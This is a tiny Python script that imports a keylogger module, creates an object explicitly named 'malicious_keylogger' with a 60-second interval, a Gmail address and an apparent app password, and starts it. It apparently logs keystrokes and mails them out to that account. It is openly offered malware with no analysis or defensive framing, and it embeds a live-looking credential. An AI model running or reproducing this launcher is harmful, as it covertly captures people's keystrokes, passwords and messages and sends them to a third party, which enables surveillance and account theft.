import keylogger


# Initialize / create keylogger
import keylogger


malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'demosp953@gmail.com', 'cdssnidpsyvqieru')

# Execute Keylogger

malicious_keylogger.start()